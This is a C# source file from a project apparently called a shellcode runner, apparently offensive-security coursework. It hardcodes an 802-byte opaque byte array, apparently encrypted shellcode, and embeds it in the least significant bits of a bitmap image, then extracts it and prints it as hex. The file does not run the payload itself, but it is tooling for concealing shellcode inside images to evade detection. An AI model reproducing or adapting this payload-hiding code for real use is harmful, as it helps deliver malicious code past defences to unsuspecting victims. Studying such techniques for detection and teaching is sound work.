using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Drawing;

namespace Module6_ShellcodeRunner
{
    class SteganographyHelper
    {
        public enum State
        {
            Hiding,
            Filling_With_Zeros
        };
        public static string byteArrayToString(byte[] ba)
        {
            StringBuilder hex = new StringBuilder(ba.Length * 2);
            foreach (byte b in ba)
                hex.AppendFormat("0x{0:x2},", b);
            return hex.ToString();
        }

        public static void Main(String[] args)
        {
            Bitmap bliss = new Bitmap(@"C:\Users\thepa\source\repos\ejb9469\Module6_ShellcodeRunner\Module6_ShellcodeRunner\bliss.bmp", false);
            byte[] pl = new byte[802] { 0xea, 0xf6, 0x59, 0x42, 0xec, 0x5a, 0xc9, 0xe9, 0x5c, 0x9e, 0x6b, 0xc6, 0xae, 0x6b, 0x04, 0x65, 0x52, 0x6f, 0x77, 0x52, 0x92, 0xf7, 0x51, 0x0b, 0xc4, 0x6f, 0x5a, 0x20, 0xbf, 0x17, 0x5a, 0x94, 0xd7, 0x19, 0x5e, 0x9c, 0x2f, 0x59, 0x10, 0xdc, 0x5e, 0x42, 0x55, 0xec, 0x43, 0x59, 0x96, 0xec, 0x86, 0x04, 0x35, 0x14, 0x1f, 0xcf, 0x56, 0x86, 0xa7, 0x04, 0xe9, 0x5c, 0xdd, 0x1c, 0x05, 0xde, 0x19, 0xb3, 0x9f, 0x14, 0xcd, 0x99, 0xe1, 0xe6, 0xe2, 0xb2, 0xc9, 0x14, 0x17, 0x19, 0xbe, 0xe6, 0xe2, 0xb2, 0x09, 0x14, 0x17, 0x39, 0xf6, 0xe6, 0x66, 0x55, 0xa3, 0x12, 0xd1, 0x7c, 0x8d, 0xe6, 0x7c, 0x44, 0x85, 0x88, 0xfd, 0x37, 0xc8, 0xc2, 0x8b, 0xc3, 0x2a, 0x93, 0x91, 0x2c, 0xc5, 0x6d, 0xc9, 0x2f, 0x9b, 0x1b, 0xed, 0x23, 0x4f, 0xe0, 0x8b, 0x89, 0xab, 0x88, 0xd6, 0x6c, 0x76, 0x0c, 0xec, 0x9c, 0xd1, 0x51, 0xa0, 0x66, 0x41, 0x00, 0x6b, 0x04, 0xe9, 0xd1, 0x1e, 0xe3, 0xc6, 0xae, 0x6b, 0xcc, 0x6e, 0x9c, 0x0a, 0x4e, 0x0e, 0xad, 0x9b, 0xb4, 0x64, 0x14, 0xa6, 0x2f, 0x4f, 0xee, 0x8b, 0xcb, 0xea, 0xac, 0x7f, 0x1d, 0x0e, 0x73, 0xa4, 0xc3, 0x64, 0x90, 0x16, 0x23, 0xc5, 0x5c, 0x28, 0xd3, 0x22, 0x14, 0xcd, 0xab, 0x2a, 0xed, 0xac, 0x4b, 0xe6, 0x1b, 0x9d, 0xac, 0x9e, 0x8e, 0x40, 0x13, 0xa5, 0x59, 0xd2, 0x8f, 0xce, 0xe9, 0x74, 0x33, 0xbe, 0xa4, 0xe6, 0x2f, 0x4f, 0xee, 0x8f, 0xcb, 0xea, 0xac, 0xfc, 0x2c, 0x4f, 0xa2, 0x23, 0xc8, 0x64, 0x1c, 0xa2, 0x24, 0xc5, 0x5e, 0x2c, 0x89, 0xed, 0xd4, 0xd6, 0x6c, 0x76, 0xed, 0x13, 0xc3, 0x91, 0x26, 0xe5, 0x11, 0x05, 0xd6, 0x2c, 0xbb, 0xaa, 0x22, 0xd6, 0xea, 0x6a, 0xce, 0x2c, 0xb2, 0x38, 0xbc, 0xe6, 0x2c, 0xfd, 0xd8, 0x23, 0x89, 0xdb, 0xb3, 0xd7, 0xb6, 0x5b, 0x73, 0x18, 0xcc, 0xfa, 0xa1, 0xef, 0x24, 0x1c, 0xfb, 0x44, 0xae, 0xc2, 0x36, 0xf9, 0x3f, 0xc6, 0xed, 0x1d, 0xcc, 0x62, 0xbb, 0xd5, 0xae, 0x88, 0xe2, 0x3e, 0xe6, 0xf0, 0xc5, 0x69, 0x1a, 0xf7, 0xe6, 0xe4, 0x23, 0x9c, 0x22, 0xd1, 0x7c, 0x86, 0xe1, 0x7c, 0x4b, 0x9c, 0x29, 0xd5, 0xf1, 0xa0, 0xdc, 0x34, 0x65, 0xe9, 0x5c, 0x9e, 0x6b, 0x5b, 0x59, 0xc3, 0x0e, 0xe9, 0x5c, 0x9e, 0x7c, 0x9d, 0xc0, 0x85, 0xd3, 0xff, 0x84, 0xb4, 0x7f, 0x9d, 0xc4, 0x74, 0xd1, 0xe9, 0x22, 0xd6, 0xe4, 0x85, 0xe5, 0xae, 0x44, 0x74, 0x5b, 0x9e, 0x6b, 0x09, 0xbd, 0xa4, 0xb1, 0x9c, 0x32, 0x9f, 0x1a, 0x0d, 0x38, 0x1e, 0x8b, 0x58, 0x9e, 0x9e, 0x6b, 0xc6, 0xae, 0xb6, 0x37, 0x41, 0x9e, 0x9e, 0x6b, 0xc6, 0xc3, 0x11, 0xcf, 0xf2, 0x8d, 0xff, 0x11, 0xf4, 0xd3, 0x3b, 0xcc, 0xc2, 0x34, 0xcd, 0x22, 0x02, 0xdb, 0x3e, 0xc6, 0x9b, 0x24, 0xee, 0x3e, 0x05, 0xed, 0x1e, 0xaa, 0xb0, 0x77, 0xf1, 0x30, 0xe2, 0xbb, 0x4d, 0xa6, 0xd0, 0x29, 0xc9, 0x23, 0x0e, 0xbf, 0x2a, 0xef, 0xc7, 0x24, 0x08, 0x7d, 0xd3, 0xe6, 0x7c, 0xb3, 0xaf, 0x4c, 0xd6, 0x33, 0x0c, 0xff, 0x3f, 0xc6, 0xac, 0x18, 0x06, 0x31, 0xf4, 0xd6, 0x7e, 0xb5, 0xbe, 0x29, 0xce, 0x48, 0xdd, 0xfe, 0x4a, 0xb1, 0xf1, 0x89, 0xcf, 0x2a, 0xd8, 0xe0, 0x7b, 0xb2, 0xc3, 0x24, 0xe9, 0x3e, 0x0e, 0xfb, 0x1d, 0xba, 0xfc, 0x3f, 0xf6, 0x73, 0xe1, 0xe0, 0x13, 0xa8, 0xfc, 0x39, 0xd0, 0x19, 0x9e, 0xbc, 0x1a, 0xd6, 0xa4, 0x4e, 0xfd, 0x3d, 0x01, 0xe7, 0x27, 0xba, 0xa8, 0x20, 0xd9, 0x47, 0x08, 0xea, 0x7c, 0xd7, 0xfb, 0x77, 0xf6, 0x49, 0x04, 0xf9, 0x45, 0xac, 0xc2, 0x90, 0xc9, 0x44, 0x91, 0xf8, 0x26, 0xcf, 0x9c, 0x4f, 0xf0, 0x20, 0x91, 0x10, 0x44, 0xc7, 0xc3, 0x50, 0xdb, 0x3c, 0xfd, 0xe2, 0x3d, 0xad, 0xa0, 0x20, 0x0e, 0x88, 0xf6, 0xf5, 0x31, 0xaf, 0x9d, 0x37, 0xf1, 0x4f, 0x10, 0xb6, 0x11, 0xac, 0x9e, 0x8d, 0xec, 0x14, 0xd5, 0xbd, 0x7c, 0xbb, 0xfc, 0x44, 0xd5, 0x45, 0xd8, 0xfe, 0x41, 0xc9, 0xaa, 0x32, 0xfd, 0x4a, 0xe4, 0x02, 0x44, 0xa1, 0x91, 0x8f, 0x9e, 0x23, 0x4d, 0x6d, 0x1a, 0xba, 0xaa, 0x24, 0xd1, 0x7c, 0x8d, 0xdf, 0x23, 0x5c, 0xe9, 0x8a, 0x36, 0xef, 0xc6, 0xae, 0x6b, 0x04, 0x99, 0x29, 0xef, 0x24, 0x83, 0x70, 0xc2, 0xb7, 0x07, 0x81, 0x83, 0xa0, 0x0e, 0x25, 0xad, 0xaa, 0xe3, 0x25, 0xd6, 0xe4, 0x55, 0x08, 0x56, 0xba, 0x9b, 0x34, 0x1e, 0x7a, 0xc6, 0xae, 0x24, 0x8b, 0x49, 0x32, 0x9a, 0x2c, 0xfd, 0xe5, 0xf1, 0x97, 0xaf, 0xe6, 0x1c, 0x6b, 0xc6, 0xae, 0x6b, 0x1d, 0x1e, 0x17, 0xcd, 0xab, 0xf7, 0xd8, 0x23, 0x8b, 0x3a, 0x17, 0xcd, 0xa4, 0x09, 0xbd, 0xa4, 0xb1, 0x9c, 0x13, 0x5b, 0xa9, 0xa9, 0xac, 0x53, 0x99, 0x38, 0xaf, 0x19, 0xab, 0xd1, 0x93, 0x23, 0x45, 0x2a, 0xd4, 0xaf, 0x6b, 0xc6, 0xe5, 0xf1, 0xc8, 0x39, 0x8f, 0x7e, 0x6b, 0xc6, 0xae, 0x6b, 0x1d, 0x1e, 0x14, 0x83, 0xa6, 0xd2, 0xb0, 0xc2, 0x6a, 0x41, 0x2f, 0x9e, 0x6b, 0xc6, 0xdf, 0x14, 0xaa, 0xa9, 0x22, 0xd5, 0xe4, 0x75, 0x6d, 0xc9, 0xf4, 0xa2, 0x9d, 0x5e, 0x6b, 0xb6, 0xae, 0x6b, 0xcb, 0x73, 0x24, 0x3a, 0x1a, 0x61, 0xae, 0x6b, 0x04, 0xe9, 0xc5, 0x69, 0x23, 0x37, 0xdf, 0x1a, 0xcc, 0x62, 0xbd, 0xd6, 0xe4, 0x55, 0xe6, 0xe4, 0x3a, 0xa2, 0x9d, 0x5e, 0x6b, 0xa6, 0xae, 0x6b, 0xcb, 0x62, 0xc3, 0xd5, 0xf1, 0xb8, 0x1c, 0xe4, 0x22, 0xe9, 0x5c, 0x9e, 0x6b, 0x5b, 0x59, 0x23, 0x81, 0x2d, 0x7c, 0x19, 0xab, 0xd2, 0x40, 0x4d, 0x89, 0xf0, 0x14, 0x9d, 0xaa, 0x41, 0x6e, 0x40, 0x32, 0x91, 0x99, 0xe6, 0x41, 0xc6, 0xd5, 0x24, 0x45, 0x2b, 0xcc, 0x49, 0x09, 0xf4, 0x73, 0xa0, 0x79 };
            Bitmap blissEnc = embedPayload(pl, bliss);
            //blissEnc.Save(@"C:\Users\thepa\source\repos\ejb9469\Module6_ShellcodeRunner\Module6_ShellcodeRunner\bliss_enc.bmp");
            byte[] plExtracted = extractPayload(blissEnc);
            System.Console.WriteLine(byteArrayToString(plExtracted));
        }

        public static Bitmap embedPayload(byte[] text, Bitmap bmp)
        {
            // initially, we'll be hiding characters in the image
            State state = State.Hiding;

            // holds the index of the character that is being hidden
            int charIndex = 0;

            // holds the value of the character converted to integer
            int charValue = 0;

            // holds the index of the color element (R or G or B) that is currently being processed
            long pixelElementIndex = 0;

            // holds the number of trailing zeros that have been added when finishing the process
            int zeros = 0;

            // hold pixel elements
            int R = 0, G = 0, B = 0;

            // pass through the rows
            for (int i = 0; i < bmp.Height; i++)
            {
                // pass through each row
                for (int j = 0; j < bmp.Width; j++)
                {
                    // holds the pixel that is currently being processed
                    Color pixel = bmp.GetPixel(j, i);

                    // now, clear the least significant bit (LSB) from each pixel element
                    R = pixel.R - pixel.R % 2;
                    G = pixel.G - pixel.G % 2;
                    B = pixel.B - pixel.B % 2;

                    // for each pixel, pass through its elements (RGB)
                    for (int n = 0; n < 3; n++)
                    {
                        // check if new 8 bits has been processed
                        if (pixelElementIndex % 8 == 0)
                        {
                            // check if the whole process has finished
                            // we can say that it's finished when 8 zeros are added
                            if (state == State.Filling_With_Zeros && zeros == 8)
                            {
                                // apply the last pixel on the image
                                // even if only a part of its elements have been affected
                                if ((pixelElementIndex - 1) % 3 < 2)
                                {
                                    bmp.SetPixel(j, i, Color.FromArgb(R, G, B));
                                }

                                // return the bitmap with the text hidden in
                                return bmp;
                            }

                            // check if all characters has been hidden
                            if (charIndex >= text.Length)
                            {
                                // start adding zeros to mark the end of the text
                                state = State.Filling_With_Zeros;
                            }
                            else
                            {
                                // move to the next character and process again
                                charValue = text[charIndex++];
                            }
                        }

                        // check which pixel element has the turn to hide a bit in its LSB
                        switch (pixelElementIndex % 3)
                        {
                            case 0:
                                {
                                    if (state == State.Hiding)
                                    {
                                        // the rightmost bit in the character will be (charValue % 2)
                                        // to put this value instead of the LSB of the pixel element
                                        // just add it to it
                                        // recall that the LSB of the pixel element had been cleared
                                        // before this operation
                                        R += charValue % 2;

                                        // removes the added rightmost bit of the character
                                        // such that next time we can reach the next one
                                        charValue /= 2;
                                    }
                                }
                                break;
                            case 1:
                                {
                                    if (state == State.Hiding)
                                    {
                                        G += charValue % 2;

                                        charValue /= 2;
                                    }
                                }
                                break;
                            case 2:
                                {
                                    if (state == State.Hiding)
                                    {
                                        B += charValue % 2;

                                        charValue /= 2;
                                    }

                                    bmp.SetPixel(j, i, Color.FromArgb(R, G, B));
                                }
                                break;
                        }

                        pixelElementIndex++;

                        if (state == State.Filling_With_Zeros)
                        {
                            // increment the value of zeros until it is 8
                            zeros++;
                        }
                    }
                }
            }

            return bmp;
        }

        public static byte[] extractPayload(Bitmap bmp)
        {
            int colorUnitIndex = 0;
            int charValue = 0;
            int count = 0;

            // holds the text that will be extracted from the image
            string extractedText = String.Empty;
            byte[] extractedData = new byte[802];

            // pass through the rows
            for (int i = 0; i < bmp.Height; i++)
            {
                // pass through each row
                for (int j = 0; j < bmp.Width; j++)
                {
                    Color pixel = bmp.GetPixel(j, i);

                    // for each pixel, pass through its elements (RGB)
                    for (int n = 0; n < 3; n++)
                    {
                        switch (colorUnitIndex % 3)
                        {
                            case 0:
                                {
                                    // get the LSB from the pixel element (will be pixel.R % 2)
                                    // then add one bit to the right of the current character
                                    // this can be done by (charValue = charValue * 2)
                                    // replace the added bit (which value is by default 0) with
                                    // the LSB of the pixel element, simply by addition
                                    charValue = charValue * 2 + pixel.R % 2;
                                }
                                break;
                            case 1:
                                {
                                    charValue = charValue * 2 + pixel.G % 2;
                                }
                                break;
                            case 2:
                                {
                                    charValue = charValue * 2 + pixel.B % 2;
                                }
                                break;
                        }

                        colorUnitIndex++;

                        // if 8 bits has been added,
                        // then add the current character to the result text
                        if (colorUnitIndex % 8 == 0)
                        {
                            // reverse? of course, since each time the process occurs
                            // on the right (for simplicity)
                            charValue = reverseBits(charValue);

                            // can only be 0 if it is the stop character (the 8 zeros)
                            /*if (charValue == 0)
                            {
                                return extractedData;
                            }*/
                            // once entire payload is extracted
                            if (count == 802)
                            {
                                return extractedData;
                            }

                            // convert the character value from int to char
                            //char c = (char)charValue;
                            byte b = (byte)charValue;

                            // add the current character to the result text
                            //extractedText += c.ToString();
                            extractedData[count] = b;
                            count++;
                        }
                    }
                }
            }

            return extractedData;
        }

        public static int reverseBits(int n)
        {
            int result = 0;

            for (int i = 0; i < 8; i++)
            {
                result = result * 2 + n % 2;

                n /= 2;
            }

            return result;
        }
    }
}
